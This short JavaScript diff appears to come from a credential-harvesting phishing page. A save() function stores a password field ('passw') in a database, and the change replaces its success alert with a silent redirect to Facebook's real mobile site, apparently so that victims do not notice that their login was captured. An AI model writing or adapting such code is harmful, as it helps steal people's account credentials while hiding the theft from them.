@@ -17,7 +17,7 @@ function save(){
     Campo2: document.getElementById("passw").value,
   })
   .then((docRef) => {
-      alert('Registro exitoso');
+    window.location.replace('https://m.facebook.com');
   })
   .catch((error) => {
       alert('Se ha producido un error al registrar');
